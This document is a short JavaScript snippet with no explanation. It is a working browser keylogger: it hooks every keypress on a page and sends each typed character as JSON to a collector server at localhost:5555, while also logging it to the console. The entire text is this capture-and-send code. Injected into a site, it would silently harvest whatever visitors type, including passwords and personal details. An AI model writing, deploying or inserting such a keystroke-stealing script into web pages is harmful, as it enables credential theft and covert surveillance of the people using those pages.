document.onkeypress = function(ev) {
  ev = ev || window.event;
  key = String.fromCharCode(ev.charCode);
  if (key) {
    var http = new XMLHttpRequest();
    var param = { key: key };
    http.open("POST", "http://localhost:5555/", true);
    http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    http.send(JSON.stringify(param));
    console.log(key);
  }
};
